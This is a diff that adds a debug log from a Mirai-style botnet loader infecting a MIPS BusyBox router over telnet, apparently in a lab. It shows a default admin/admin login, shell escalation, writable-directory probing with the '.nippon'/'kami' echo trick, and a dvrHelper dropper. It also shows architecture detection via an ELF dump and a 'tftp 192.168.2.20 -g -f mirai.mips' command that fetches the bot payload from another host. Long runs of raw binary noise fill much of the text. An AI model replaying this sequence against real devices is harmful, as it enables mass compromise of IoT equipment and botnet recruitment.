@@ -1,0 +1,1005 @@
+(1/9) bins/dlr.arm is loading...
+(2/9) bins/dlr.arm7 is loading...
+(3/9) bins/dlr.m68k is loading...
+(4/9) bins/dlr.mips is loading...
+(5/9) bins/dlr.mpsl is loading...
+(6/9) bins/dlr.ppc is loading...
+(7/9) bins/dlr.sh4 is loading...
+(8/9) bins/dlr.spc is loading...
+(9/9) bins/dlr.x86 is loading...
+[FD13] Called connection_open
+[FD13] Established connection
+TELIN: ÿıÿı!ÿûÿû
+Hit end of input.
+TELIN: Login: 
+matched login prompt at 5, ":", "Login: ıÿı"
+TELOUT:
+  0000  61 64 6d 69 6e                                   admin
+matched password prompt at 0, ":", ": "
+TELIN: admin
+matched password prompt at 0, ":", ": adminıÿı"
+TELOUT:
+  0000  0d 0a                                            ..
+TELIN: 
+Password: 
+matched password prompt at 17, ":", ": admin
+Password: "
+TELOUT:
+  0000  61 64 6d 69 6e                                   admin
+matched any prompt at 0, ":", ": "
+TELOUT:
+  0000  0d 0a                                            ..
+TELIN: 
+> 
+matched any prompt at 4, ">", ": 
+> n
+Password: "
+TELOUT:
+  0000  65 6e 61 62 6c 65 0d 0a                          enable..
+TELOUT:
+  0000  73 68 65 6c 6c 0d 0a                             shell..
+TELOUT:
+  0000  73 68 0d 0a                                      sh..
+matched any prompt at 0, ">", "> "
+TELIN: enable
+enable: not found
+> 
+matched any prompt at 29, ">", "> enable
+enable: not found
+> "
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: shell
+
+TELIN: shell: not found
+> sh
+
+TELIN: /bin/busybox ECCHI
+
+
+BusyBox v1.00 (2009.08.10-02:17+0000) Built-in shell (msh)
+Enter 'help' for a list of built-in commands.
+
+# /bin/busybox EC
+TELIN: CHI
+
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+[FD13] Succesfully logged in
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 70 73 3b  /bin/busybox ps;
+  0010  20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43   /bin/busybox EC
+  0020  43 48 49 0d 0a                                   CHI..
+TELIN: /
+TELIN: bin/busybox ps; /bin/busybox ECCHI
+  PID  Uid     VmSize Stat Command
+    1 admin       280 S   init                
+
+pid: 0, proc_name: ECCHI
+pid: 0, proc_name: Command
+pid: 1, proc_name: init
+TELIN:     2 admin           SWN [ksoftirqd/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:     3 admin           SW< [events/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:     4 admin           SW< [khelper]
+
+pid: 0, proc_name: ECCHI
+TELIN:     5 admin           SW< [kblockd/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:    15 admin           SW  [pdflush]
+
+pid: 0, proc_name: ECCHI
+TELIN:    16 admin           SW  [pdflush]
+
+pid: 0, proc_name: ECCHI
+TELIN:    17 admin           SW  [kswapd0]
+
+pid: 0, proc_name: ECCHI
+TELIN:    18 admin           SW< [aio/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:    23 admin           SW  [mtdblockd]
+
+pid: 0, proc_name: ECCHI
+TELIN:    34 admin       324 S   -sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:    74 admin      1612 S   cfm 
+
+pid: 0, proc_name: ECCHI
+TELIN:   272 admin       216 S   pvc2684d 
+
+pid: 0, proc_name: ECCHI
+TELIN:   473 admin       200 S   wps_btn 
+
+pid: 0, proc_name: ECCHI
+TELIN:   520 admin       816 S   snmp
+
+pid: 0, proc_name: ECCHI
+TELIN:   529 admin      1724 S   tr64
+
+pid: 0, proc_name: ECCHI
+TELIN:   550 admin      1768 S   httpd
+
+pid: 0, proc_name: ECCHI
+TELIN:   551 admin      1612 S   cfm 
+
+pid: 0, proc_name: ECCHI
+TELIN:   557 admin       364 S   pppd -c 0.0.35.1 -i nas_0_0_35 -u -f 0 -M 1492 
+
+pid: 0, proc_name: ECCHI
+TELIN:   681 admin      1624 S   telnetd
+
+pid: 0, proc_name: ECCHI
+TELIN:   682 admin      1644 S   telnetd
+
+pid: 0, proc_name: ECCHI
+TELIN:   685 admin       288 S   sh -c sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:   686 admin       324 S   sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:   688 admin       284 R   ps              
+
+pid: 0, proc_name: ECCHI
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74  /bin/busybox cat
+  0010  20 2f 70 72 6f 63 2f 6d 6f 75 6e 74 73 3b 20 2f   /proc/mounts; /
+  0020  62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43 48  bin/busybox ECCH
+  0030  49 0d 0a                                         I..
+TELIN: /
+TELIN: bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+
+TELIN: rootfs / rootfs rw 0 0
+/dev/root / squashfs ro 0 0
+/proc /proc proc rw,nodiratime 0 0
+none /mnt tmpfs rw 0 0
+tmpfs /var tmpfs rw 0 0
+
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 27 20 3e 20 2f 2e 6e 69 70 70  6d\x69' > /.nipp
+  0030  6f 6e 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78  on; /bin/busybox
+  0040  20 63 61 74 20 2f 2e 6e 69 70 70 6f 6e 3b 20 2f   cat /.nippon; /
+  0050  62 69 6e 2f 62 75 73 79 62 6f 78 20 72 6d 20 2f  bin/busybox rm /
+  0060  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 70 72 6f 63 27 20 3e 20 2f  6d\x69/proc' > /
+  0030  70 72 6f 63 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62  proc/.nippon; /b
+  0040  69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f  in/busybox cat /
+  0050  70 72 6f 63 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62  proc/.nippon; /b
+  0060  69 6e 2f 62 75 73 79 62 6f 78 20 72 6d 20 2f 70  in/busybox rm /p
+  0070  72 6f 63 2f 2e 6e 69 70 70 6f 6e 0d 0a           roc/.nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 6d 6e 74 27 20 3e 20 2f 6d  6d\x69/mnt' > /m
+  0030  6e 74 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  nt/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 6d 6e  /busybox cat /mn
+  0050  74 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  t/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 6d 6e 74 2f  busybox rm /mnt/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 76 61 72 27 20 3e 20 2f 76  6d\x69/var' > /v
+  0030  61 72 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  ar/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 76 61  /busybox cat /va
+  0050  72 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  r/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 76 61 72 2f  busybox rm /var/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 64 65 76 27 20 3e 20 2f 64  6d\x69/dev' > /d
+  0030  65 76 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  ev/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 64 65  /busybox cat /de
+  0050  76 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  v/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 64 65 76 2f  busybox rm /dev/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: /
+TELIN: bin/busy
+TELIN: box echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon;  /bin/busybox rm /.nippo
+TELIN: n
+
+TELIN: /.nippon
+TELIN: : cannot create
+
+TELIN: cat
+TELIN: : /.nippon: No such file or directory
+
+TELIN: rm: cannot remove `/.nippon'
+TELIN: : No such file or directory
+TELIN: 
+
+TELIN: # 
+TELIN: /
+TELIN: b
+TELIN: i
+TELIN: n
+TELIN: /
+TELIN: b
+TELIN: u
+TELIN: s
+TELIN: ybox
+TELIN:  ec
+TELIN: h
+TELIN: o 
+TELIN: -e '\
+TELIN: x
+TELIN: 6
+TELIN: b\
+TELIN: x
+TELIN: 61
+TELIN: \x
+TELIN: 6d\x
+TELIN: 69/p
+TELIN: ro
+TELIN: c'
+TELIN:  > /pr
+TELIN: oc/.
+TELIN: nipp
+TELIN: on; /bin/busybox ca
+TELIN: t  /pro
+TELIN: c/.n
+TELIN: ippon
+TELIN: ; 
+TELIN: /bi
+TELIN: n/b
+TELIN: usy
+TELIN: box rm /proc/.nippon
+
+TELIN: /proc/.nippon
+TELIN: : cannot create
+
+TELIN: cat
+TELIN: : /proc/.nippon: No such file or directory
+rm: cannot remove `/proc/.nippon': No such file or directory
+# 
+TELIN: /b
+TELIN: in
+TELIN: /bu
+TELIN: sybo
+TELIN: x
+TELIN:  
+TELIN: ec
+TELIN: h
+TELIN: o 
+TELIN: -
+TELIN: e '
+TELIN: \
+TELIN: x
+TELIN: 6
+TELIN: b
+TELIN: \
+TELIN: x
+TELIN: 6
+TELIN: 1
+TELIN: \x6
+TELIN: d
+TELIN: \x
+TELIN: 6
+TELIN: 9/
+TELIN: mnt' >
+TELIN:  /mn
+TELIN: t
+TELIN: /
+TELIN: .n
+TELIN: ippo
+TELIN: n
+TELIN: ; 
+TELIN: /bin/b
+TELIN: u
+TELIN: sy
+TELIN: box
+TELIN:  
+TELIN: cat
+TELIN:  
+TELIN: / 
+TELIN: mnt/
+TELIN: .
+TELIN: n
+TELIN: i
+TELIN: pp
+TELIN: on; 
+TELIN: /b
+TELIN: in/bus
+TELIN: y
+TELIN: b
+TELIN: ox
+TELIN:  
+TELIN: r
+TELIN: m
+TELIN:  
+TELIN: /
+TELIN: mnt/
+TELIN: .
+TELIN: n
+TELIN: i
+TELIN: ppon
+TELIN: 
+
+TELIN: kami/mnt
+
+TELIN: # 
+TELIN: /bin/busybox echo -e '\x6b\x61\x6d\x69/var' > /var/.ni
+TELIN: ppon;
+TELIN:  /b
+TELIN: in
+TELIN: /b
+TELIN: usy
+TELIN: b
+TELIN: ox
+TELIN:  ca
+TELIN: t 
+TELIN: / v
+TELIN: ar
+TELIN: /.n
+TELIN: i
+TELIN: p
+TELIN: po
+TELIN: n
+TELIN: ;
+TELIN:  /
+TELIN: bi
+TELIN: n/busybo
+TELIN: x r
+TELIN: m 
+TELIN: /v
+TELIN: ar/
+TELIN: .n
+TELIN: ipp
+TELIN: on
+
+TELIN: kami/var
+
+TELIN: # /bin/busybox
+TELIN:  
+TELIN: ech
+TELIN: o 
+TELIN: -e '\x6b\x
+TELIN: 61\x6d
+TELIN: \x
+TELIN: 69/d
+TELIN: e
+TELIN: v'
+TELIN:  
+TELIN: >
+TELIN:  
+TELIN: /de
+TELIN: v/
+TELIN: .n
+TELIN: ip
+TELIN: p
+TELIN: o
+TELIN: n; 
+TELIN: /b
+TELIN: i
+TELIN: n
+TELIN: /bu
+TELIN: s
+TELIN: y
+TELIN: b
+TELIN: o
+TELIN: x
+TELIN:  
+TELIN: c
+TELIN: a
+TELIN: t
+TELIN:  
+TELIN: / 
+TELIN: d
+TELIN: ev/
+TELIN: .
+TELIN: ni
+TELIN: p
+TELIN: pon
+TELIN: ;
+TELIN:  /b
+TELIN: in/b
+TELIN: usybox rm 
+TELIN: /dev/.nippon
+TELIN: 
+
+TELIN: /dev/.nippon
+TELIN: : cannot 
+TELIN: create
+TELIN: 
+
+TELIN: cat
+TELIN: : /dev/.nippon: No such file or directory
+
+TELIN: rm
+TELIN: : 
+TELIN: cannot remove `
+TELIN: /dev/.nippon
+TELIN: ': 
+TELIN: No such file or directory
+TELIN: 
+
+TELIN: # 
+TELIN: /
+TELIN: b
+TELIN: in
+TELIN: /
+TELIN: b
+TELIN: u
+TELIN: sy
+TELIN: b
+TELIN: o
+TELIN: x
+TELIN:  E
+TELIN: CC
+TELIN: H
+TELIN: I
+
+TELIN: ECCHI
+TELIN: : 
+TELIN: applet not found
+TELOUT:
+  0000  72 6d 20 2f 6d 6e 74 2f 2e 74 3b 20 72 6d 20 2f  rm /mnt/.t; rm /
+  0010  6d 6e 74 2f 2e 73 68 3b 20 72 6d 20 2f 6d 6e 74  mnt/.sh; rm /mnt
+  0020  2f 2e 68 75 6d 61 6e 0d 0a                       /.human..
+TELOUT:
+  0000  72 6d 20 2f 76 61 72 2f 2e 74 3b 20 72 6d 20 2f  rm /var/.t; rm /
+  0010  76 61 72 2f 2e 73 68 3b 20 72 6d 20 2f 76 61 72  var/.sh; rm /var
+  0020  2f 2e 68 75 6d 61 6e 0d 0a                       /.human..
+[FD13] Found writeable directory: /mnt/
+TELOUT:
+  0000  63 64 20 2f 6d 6e 74 2f 0d 0a                    cd /mnt/..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 70 20  /bin/busybox cp 
+  0010  2f 62 69 6e 2f 65 63 68 6f 20 64 76 72 48 65 6c  /bin/echo dvrHel
+  0020  70 65 72 3b 20 3e 64 76 72 48 65 6c 70 65 72 3b  per; >dvrHelper;
+  0030  20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68   /bin/busybox ch
+  0040  6d 6f 64 20 37 37 37 20 64 76 72 48 65 6c 70 65  mod 777 dvrHelpe
+  0050  72 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20  r; /bin/busybox 
+  0060  45 43 43 48 49 0d 0a                             ECCHI..
+TELIN: 
+
+TELIN: rm /mnt/.t; rm /mnt/.sh; rm /mnt/.human
+# rm /mnt/.t; rm /mnt/.sh; rm /mnt/.human
+
+TELIN: rm /var/.t; rm /var/.sh; rm /var/.human
+cd /mnt/
+/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+
+TELIN: rm
+TELIN: : cannot remove `
+TELIN: /mnt/.t'
+TELIN: : No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/mnt/.sh': No such file or directory
+
+TELIN: rm: 
+TELIN: cannot remove `/mnt/.human': No such file or directory
+
+TELIN: # 
+TELIN: rm
+TELIN:  /
+TELIN: va
+TELIN: r
+TELIN: /.
+TELIN: t;
+TELIN:  r
+TELIN: m 
+TELIN: /v
+TELIN: ar
+TELIN: /
+TELIN: .sh; rm
+TELIN:  /va
+TELIN: r/
+TELIN: .hum
+TELIN: a
+TELIN: n
+TELIN: 
+
+TELIN: rm
+TELIN: : cannot remove `/var/.t': No such file or directory
+
+TELIN: rm: 
+TELIN: cannot remove `/var/.sh
+TELIN: '
+TELIN: : No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/var/.human': No such file or directory
+# cd /mnt/
+# /bin/busybox 
+TELIN: c
+TELIN: p 
+TELIN: /bi
+TELIN: n/
+TELIN: echo dvrHelpe
+TELIN: r;
+TELIN:  
+TELIN: >d
+TELIN: vr
+TELIN: H
+TELIN: e
+TELIN: lp
+TELIN: er
+TELIN: ; /
+TELIN: bi
+TELIN: n/bu
+TELIN: syb
+TELIN: ox 
+TELIN: chmod 777
+TELIN:  dvrHel per
+TELIN: ; 
+TELIN: /bi
+TELIN: n/b
+TELIN: usy
+TELIN: box E
+TELIN: CCH
+TELIN: I
+
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+[FD13] Finished copying /bin/echo to cwd
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74  /bin/busybox cat
+  0010  20 2f 62 69 6e 2f 65 63 68 6f 0d 0a               /bin/echo..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: /
+TELIN: bin/bu
+TELIN: sybox cat /bin/echo
+ELF
+TELIN: 
+TELIN: Ç
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: y
+TELIN: al_root_device_name
+TELIN: t
+TELIN: parseImageData
+TELIN:  ¯¢
+TELIN:      8!$
+TELIN: 
+TELIN: £
+TELIN: @È! ø       
+TELIN: @ !'9[h ø 
+TELIN: ™l™ƒœ ø  '¥
+TELIN: „€ ™‚x
+TELIN: 
+TELIN: $
+TELIN: 
+TELIN: <™€'9o` ø        
+TELIN:   
+TELIN: 
+TELIN: <À'œP™à!'½ÿÈ¯¿
+TELIN: 
+TELIN: 
+TELIN: ²@±<°8à
+TELIN: l ø 
+TELIN: °
+TELIN: $¢
+TELIN: ¼
+TELIN: ¼
+TELIN: Œƒ$l§¥´$B!¯¢
+TELIN:  $
+TELIN:    $Æ#¼
+TELIN: ¼
+TELIN: 
+TELIN: € ™‚|
+TELIN: ¼
+TELIN: ¼
+TELIN: 
+TELIN: 
+TELIN: ²
+TELIN: …€ &YÌğ ø  $¥*ì¼
+TELIN: ¯¿
+TELIN:  !Ü
+TELIN: €$$YÓ0 ø     
+TELIN: µ
+TELIN: 
+TELIN: b
+TELIN: 2<¢
+TELIN: &1
+TELIN:  ø   
+TELIN: 
+TELIN:  ø ¯´
+TELIN: ¢
+TELIN:  ø  $„88£`
+TELIN: 
+TELIN: € ™\
+TELIN: …€ ™ì` !$¥9H ø  @0!¼
+TELIN: ¬@
+TELIN: 
+TELIN: 
+TELIN: ¼
+TELIN: 'œfT™à!'½ÿØ¯¿
+TELIN: ’€&1ÿÿ&B @ !€‚
+TELIN: 
+TELIN: 
+TELIN: ™ ø      $„D,¼
+TELIN: $ÂD€$ãD”M
+TELIN: ³
+TELIN:  ø   $¥H@
+TELIN: ™…¤ ø   € !¼
+TELIN: ¨!À
+TELIN: à!'½ÿÀ¯¾
+TELIN: 
+TELIN: ¼
+TELIN: (!™„Ô ø        
+TELIN: ¥
+TELIN: ™‚p
+TELIN: Í'§x™‚Œ ø     !
+TELIN: €0!‚€$…€ À8!$PhÄ
+TELIN: &1
+TELIN: '½ÿà¯¿
+TELIN: ™à!ƒ€ŒbMh¬‚
+TELIN:    $
+TELIN: °!T#` !@(!'9‡Ğ ø        
+TELIN: 
+
+TELIN: ™€('9, ø       
+TELIN: ¯±
+TELIN: ´ŒD
+TELIN: 
+TELIN: 8!¢P¥TŒD
+TELIN: $„+t
+TELIN: ™¬FMd‚€ŒBMp¯¢ü‚€ŒBMt¯¢
+TELIN: !'½ÿĞ¯¿
+TELIN: 
+TELIN: ‚€ŒB*@
+TELIN: ´‚€(Œc
+TELIN: @
+TELIN:     $
+TELIN: @
+TELIN: 
+TELIN: ™à!'½ÿØ¯¿
+TELIN: 
+TELIN: ™€(&ÿÿ®CMD$„Qˆ'9® ø        ®"MH¼
+TELIN: <¿'œ·ü™à!'½ÿØ¯¿
+TELIN: ¼
+TELIN: €
+TELIN: '9u ø   ŒDO$¼
+TELIN: $
+TELIN: ¢
+TELIN: 
+TELIN: €®
+TELIN: 
+TELIN: 
+TELIN:  $¥
+TELIN: &ùsÀŒDMˆ ø     $r®¼
+TELIN: ¼
+TELIN: 
+TELIN: ÿ'9 ø      ®"P
+TELIN: °
+TELIN: @ !T
+TELIN: ö&s
+TELIN: ™‡8ŒE
+TELIN:        
+TELIN: 
+TELIN: l ø      Œ^OüO8¼
+TELIN: @
+TELIN: BO„@
+TELIN: 
+TELIN:  ø    $
+TELIN: ¼
+TELIN: ³
+TELIN: ¯²
+TELIN: 
+TELIN: Q$P
+TELIN: ™ƒ 
+TELIN:     
+TELIN: ¤ŒC
+TELIN: Œ
+TELIN: 
+TELIN: 
+TELIN: ¼
+TELIN: !
+TELIN: 
+TELIN: ¯¿,¯´(¯³$¯² ¯±¯°¯¼
+TELIN: !@ÿ×™‚4™‚à€ ! ø      €!¼
+TELIN: 
+TELIN: 
+TELIN: ‚
+TELIN: B
+TELIN: à
+TELIN: !¼
+TELIN: ¼
+TELIN: 8!ŒÂ
+TELIN: ø      
+TELIN: $+@
+TELIN: 
+TELIN: 
+TELIN:  ø        
+TELIN: (<¾'œÇp™à!'½ÿà¯¿
+TELIN: $„Œ 
+TELIN: P#$
+TELIN: x! ø      $´™€àx! ø      $¯™€àx! ø      $®™€àx! ø      $ª™€àx! ø      $©™€àx! ø      $¨™€àx! ø      $§™€àx! ø      $£™€àx! ø      $¢™€àx! ø      $¡™€àx! ø      $ ™€àx! ø      $™€àx! ø      $š™€àx! ø      $™™€àx! ø      $’™€àx! ø      $™€àx! ø      $‹™€àx! ø      $ˆ™€àx! ø      $‡™€àx! ø      $†™€àx! ø      $„™€àx! ø      $™€àx! ø      $€™€àx! ø      $™€àx! ø       $~™€àx! ø      $}™€àx! ø      $z™€àx! ø      $y™€àx! ø      $w™€àx! ø      $q™€àx! ø      $m™€àx! ø      $k™€àx! ø      $j™€àx! ø      $h™€àx! ø      $g™€àx! ø      $f™€àx! ø      $d™€àx! ø      $c™€àx! ø      $`™€àx! ø      $^™€àx! ø      $\™€àx! ø      $[™€àx! ø      $Y™€àx! ø      $X™€àx! ø      $V™€àx! ø      $T™€àx! ø      $Q™€àx! ø      $O™€àx! ø      $M™€àx! ø      $K™€àx! ø      $J™€àx! ø      $I™€àx! ø      
+TELIN: $G™€àx! ø      $E™€àx! ø      $B™€àx! ø      $>™€àx! ø      $;™€àx
+TELIN: ! ø      $7™€àx! ø      $5™€àx! ø      $4™€àx! ø      $2™€àx! ø      $0™€àx! ø      $.™€àx! ø      $,™€àx! ø      $*™€àx! ø      $)™€àx! ø      $"™€àx! ø      $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø        $™€àx! ø       $™€àx! ø       $
+™€àx! ø        $       ™€àx! ø        $™€àx! ø       $
+TELIN: ™€àx! ø       $™€àx! ø       $™€àx! ø       $
+TELIN:  $
+TELIN: usyBox
+        will act like whatever it was invoked as.
+
+Currently defined functions:
+
+TELIN: '
+        -I[TIMESPEC]    Outputs an ISO-8601 compliant date/time string.
+                        TIMESPEC=`date' (or missing) for date only,
+                        `hours', `minutes', or `seconds' for date and,
+                        time to the indicated precision.
+        -s              Sets time described by STRING
+        -r FILE         Displays the last modification time of FILE
+        -u              Prints or sets Coordinated Universal Time
+TELIN: used, they return the number 
+of characters matched or 0.
+TELIN: <address>]  [metric <NN>]  [mtu <NN>]
+        [[-]trailers]  [[-]arp]  [[-]allmulti]
+        [multicast]  [[-]promisc]  [txqueuelen <NN>]  [[-]dynamic]
+        [up|down] ...
+TELIN: al names and numbers.
+TELIN: is SIGTERM) to the specified process(es).
+
+Options:
+        -l      List all signal names and numbers.
+        -q      Do not complain if no processes were killed.
+TELIN: ereference symlinks - treat like normal file
+TELIN: 
+        -s      list the size of each file, in blocks
+        -t      with -l: show modification time
+        -u      with -l: show access time
+        -v      sort the listing by version
+        -x      list entries by lines instead of by columns
+        -X      sort the listing by extension
+
+TELIN: sync:     Writes are asynchronous / synchronous.
+        atime/noatime:  Enable / disable updates to inode access times.
+        dev/nodev:      Allow use of special device files / disallow them.
+        exec/noexec:    Allow use of executable files / disallow them.
+        suid/nosuid:    Allow set-user-id-root programs / disallow them.
+        remount:        Re-mount a mounted filesystem, changing its flags.
+        ro/rw:          Mount for read-only / read-write.
+        bind:           Use the linux 2.4.x "bind" feature.
+
+There are EVEN MORE flags that are specific to each filesystem.
+You'll have to see the written documentation for those filesystems.
+TELIN: y COUNT pings.
+        -s SIZE         Send SIZE data bytes in packets (default=56).
+        
+TELIN: -q              Quiet mode, only displays output at start
+                        and when finished.
+TELIN: it the kernel's routing tables.
+
+Options:
+        -n              Dont resolve names.
+        -e              Display other/more information.
+        -A inet         Select address family.
+TELIN: ]        remote log level
+TELIN: backup configuration
+data to a tftp server.
+
+Options:
+-g      Get file. (Update image/configuration data)
+-p      Put file. (backup configuration data)
+-f      remote file name.
+-t      i for image and c for configuration data.
+
+TELIN: os]
+        set_name_type   [name-type]
+TELIN: ent
+TELIN:  
+TELIN: ry allocation failure
+TELIN: gStats
+TELIN: f    Use
+TELIN: ace
+
+TELIN: d%d
+
+TELIN: 
+TELIN: /null
+TELIN:  -t filter -X IPFLTIN 2>/dev/null
+TELIN: .
+TELIN:  used, %ldK free, %ldK shrd, %ldK buff, %ldK cached
+
+TELIN: 
+TELIN: cannot redirect shell command
+TELIN: 
+TELIN: buffer from syslogd
+TELIN: odiratime
+TELIN: ounted read-only
+TELIN: X
+TELIN: et
+TELIN: es found.
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: tÔ»0âJß¥A=Ø•×¤ÑÄmÓÖôûCiéj4nÙü­gˆFÚ`¸ĞD-s3åª
+L_İ|ÉPq<'Aª¾É †Whµ% o…³¹fÔ ÎaäŸ^Şù)ÙÉ˜°Ğ˜"Ç×¨´Y³=.´·½\;Àºl­í¸ƒ š¿³¶¶ât±ÒšêÕG9Òw¯Û&sÜƒãc”d;„mj>zjZ¨äÏ“      ÿ
+
+TELIN: 
+TELIN: ÿÿÿ
+TELIN: ğ
+TELIN: BŞp
+TELIN: # 
+TELIN: /
+TELIN: bi
+TELIN: n/b
+TELIN: usybo
+TELIN: x 
+TELIN: E
+TELIN: CC
+TELIN: HI
+
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+[FD13] Detected architecture: 'mips'
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65  /bin/busybox wge
+  0010  74 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20  t; /bin/busybox 
+  0020  74 66 74 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62  tftp; /bin/busyb
+  0030  6f 78 20 45 43 43 48 49 0d 0a                    ox ECCHI..
+TELIN: /
+TELIN: bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI
+
+TELIN: wget
+TELIN: : applet not found
+
+TELIN: BusyBox v1.00 (2009.08.10-02:17+0000) multi-call binary
+TELIN: 
+
+Usage: tftp [OPTION]... tftp_server_ip
+
+Update firmware image and configuration data from OR backup configuration
+data to a tftp server.
+
+Options:
+-g      Get file. (Update image/configuration data)
+-p      Put file. (backup configuration data)
+-f      remote file name.
+-t      i for image and c for configuration data.
+
+
+ECCHI: applet not found
+# 
+[FD13] Upload method is TELOUT:
+  0000  74 66 74 70 20 20 20 20 31 39 32 2e 31 36 38 2e  tftp    192.168.
+  0010  32 2e 32 30 20 2d 67 20 2d 66 20 6d 69 72 61 69  2.20 -g -f mirai
+  0020  2e 6d 69 70 73 20 3b 20 20 0d 0a                 .mips ;  ..
+tftp
+TELIN: t
+TELIN: ftp    192.168.2.20 -g -f mirai.mips ;  
+
+TELIN: bcmUploadPrepare ... curPid[723] ifPid[0] ifName[br0]
+
+
+TELIN: Number of processes: 26
+
+TELIN:  12:24am  up 24 min, 
+load average: 1 min:0.12, 5 min:0.06, 15 min:0.04
+              total         used         free       shared      buffers
+  Mem:        14180        13724          456            0         1100
+ Swap:            0            0            0
+Total:        14180        13724          456
+
+TELIN:   PID  Uid     VmSize Stat Command
+    1 admin       280 S   init                
+    2 admin           SWN [ksoftirqd/0]
+    3 admin           SW< [events/0]
+    4 admin           SW< [khelper]
+    5 admin           SW< [kblockd/0]
+   15 admin           SW  [pdflush]
+   16 admin           SW  [pdflush]
+   17 admin           SW  [kswapd0]
+   18 admin           SW< [aio/0]
+   23 admin           SW  [mtdblockd]
+   34 admin       324 S   -sh 
+   74 admin      1612 S   cfm 
+  272 admin       216 S   pvc2684d 
+  473 admin       200 S   wps_btn 
+  520 admin       816 S   snmp
+  529 admin      1724 S   tr64
+  550 admin      1768 S   httpd
+  551 admin      1612 S   cfm 
+  557 admin       364 S   pppd -c 0.0.35.1 -i nas_0_0_35 -u -f 0 -M 1492 
